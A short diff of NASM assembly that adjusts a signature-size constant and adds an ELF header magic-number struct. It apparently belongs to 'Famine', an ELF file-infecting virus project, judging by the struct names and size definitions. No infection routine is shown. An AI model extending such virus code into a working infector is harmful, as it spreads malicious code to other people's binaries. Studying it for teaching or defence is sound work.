@@ -1,6 +1,6 @@
 %define PROG_SIZE   _end - main
 %define JMP_OFFSET  jump - main
-%define SIGNATURE_SIZE _end - signature
+%define SIGNATURE_SIZE _end - signature - 1
 %define O_WRONLY	1
 %define O_RDWR      2
 %define O_APPEND	1024
@@ -46,6 +46,15 @@ struc Elf64_Phdr
     p_memsz:  resq 1 ;		/* Segment size in memory */
     p_align:  resq 1 ;		/* Segment alignment */
 endstruc
+
+struc magic_num
+    s_magic_number:	resd 1;
+	s_support:	 	resb 1;
+	s_endian:		resb 1;
+	s_version:		resb 1;	
+	s_abi:			resb 1;	
+endstruc
+
 
 struc famine
     fileName:   resq 1
